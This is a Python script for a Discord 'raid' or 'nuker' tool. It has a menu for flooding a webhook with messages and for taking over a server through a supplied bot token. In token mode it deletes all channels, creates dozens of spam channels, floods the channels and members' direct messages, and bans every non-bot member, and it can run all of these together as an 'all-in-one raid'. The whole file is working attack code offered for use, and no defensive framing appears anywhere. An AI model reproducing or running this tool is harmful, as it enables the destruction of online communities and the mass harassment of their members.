import requests
import threading
import time
import discord
import asyncio
from discord.ext import commands
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_menu():
    print(f"{Fore.RED}==============================")
    print(f"{Fore.RED}||")
    print(f"{Fore.RED}||    1. Spam a Webhook")
    print(f"{Fore.RED}||    2. Bot Token Raid")
    print(f"{Fore.RED}||")
    print(f"{Fore.RED}==============================")

def spam_webhook():
    webhook_url = input(f"{Fore.GREEN}Enter the Webhook URL: ")
    message = input(f"{Fore.GREEN}Enter the message: ")
    count = int(input(f"{Fore.GREEN}How many messages to send? "))

    def send_message():
        for _ in range(count):
            response = requests.post(webhook_url, json={"content": message})
            if response.status_code != 204:
                print(f"{Fore.RED}Failed to send message: {response.status_code}")
            time.sleep(0.01)  # adjust if necessary to avoid rate limits

    threading.Thread(target=send_message).start()

def bot_token_raid():
    bot_token = input(f"{Fore.GREEN}Enter the Bot Token: ")
    intents = discord.Intents.default()
    intents.members = True  # Enable members intent
    intents.presences = True  # Enable presences intent
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f"{Fore.YELLOW}Bot logged in as {bot.user}")

        print(f"{Fore.RED}1. Delete all channels")
        print(f"{Fore.RED}2. Delete token")
        print(f"{Fore.RED}3. Spam bot messages")
        print(f"{Fore.RED}4. Create channels and message")
        print(f"{Fore.RED}5. DM all members")
        print(f"{Fore.RED}6. Ban all members")
        print(f"{Fore.RED}7. All-in-one raid")

        choice = input(f"{Fore.GREEN}Choose an option: ")

        if choice == "1":
            guild = bot.guilds[0]
            for channel in guild.channels:
                await channel.delete()
                print(f"{Fore.RED}Deleted channel {channel.name}")
        elif choice == "2":
            print(f"{Fore.RED}Token deleted (symbolically)")
        elif choice == "3":
            message = input(f"{Fore.GREEN}Enter the message: ")

            async def spam_messages():
                while True:
                    for channel in bot.guilds[0].channels:
                        try:
                            await channel.send(message)
                            print(f"{Fore.RED}Sent message in channel {channel.name}")
                        except:
                            print(f"{Fore.RED}Failed to send message in channel {channel.name}")
                        await asyncio.sleep(0.01)  # adjust if necessary to avoid rate limits

            asyncio.create_task(spam_messages())
        elif choice == "4":
            guild = bot.guilds[0]
            message = input(f"{Fore.GREEN}Enter the message: ")
            count = int(input(f"{Fore.GREEN}How many messages per channel? "))

            async def create_channels_and_spam():
                for _ in range(50):  # Maximum number of channels to create
                    channel = await guild.create_text_channel("spam-channel")
                    print(f"{Fore.RED}Created channel {channel.name}")

                    for _ in range(count):
                        await channel.send(message)
                        print(f"{Fore.RED}Sent message in channel {channel.name}")

            asyncio.create_task(create_channels_and_spam())
        elif choice == "5":
            guild = bot.guilds[0]
            message = input(f"{Fore.GREEN}Enter the message: ")
            count = int(input(f"{Fore.GREEN}How many messages to send per member? "))

            async def spam_dms(member):
                for _ in range(count):
                    try:
                        await member.send(message)
                        print(f"{Fore.RED}Sent DM to {member.name}")
                    except:
                        print(f"{Fore.RED}Failed to send DM to {member.name}")

            for member in guild.members:
                if not member.bot:
                    asyncio.create_task(spam_dms(member))
        elif choice == "6":
            guild = bot.guilds[0]
            for member in guild.members:
                if not member.bot:
                    await member.ban(reason="Banned by bot")
                    print(f"{Fore.RED}Banned {member.name}")
        elif choice == "7":
            guild = bot.guilds[0]
            message = input(f"{Fore.GREEN}Enter the message for channels: ")
            count = int(input(f"{Fore.GREEN}How many messages per channel? "))
            dm_message = input(f"{Fore.GREEN}Enter the DM message: ")
            dm_count = int(input(f"{Fore.GREEN}How many DMs to send per member? "))

            async def all_in_one_raid():
                # Delete all existing channels
                for channel in guild.channels:
                    await channel.delete()
                    print(f"{Fore.RED}Deleted channel {channel.name}")

                # Create new channels and spam messages
                for _ in range(50):  # Maximum number of channels to create
                    channel = await guild.create_text_channel("spam-channel")
                    print(f"{Fore.RED}Created channel {channel.name}")

                    for _ in range(count):
                        await channel.send(message)
                        print(f"{Fore.RED}Sent message in channel {channel.name}")

                # Spam DMs to all members
                for member in guild.members:
                    if not member.bot:
                        for _ in range(dm_count):
                            try:
                                await member.send(dm_message)
                                print(f"{Fore.RED}Sent DM to {member.name}")
                            except:
                                print(f"{Fore.RED}Failed to send DM to {member.name}")

                # Ban all members
                for member in guild.members:
                    if not member.bot:
                        await member.ban(reason="Banned by bot")
                        print(f"{Fore.RED}Banned {member.name}")

            asyncio.create_task(all_in_one_raid())

    asyncio.run(bot.start(bot_token))

def main():
    print_menu()
    choice = input(f"{Fore.GREEN}Choose an option: ")

    if choice == "1":
        spam_webhook()
    elif choice == "2":
        bot_token_raid()
    else:
        print(f"{Fore.RED}Invalid choice")

if __name__ == "__main__":
    main()
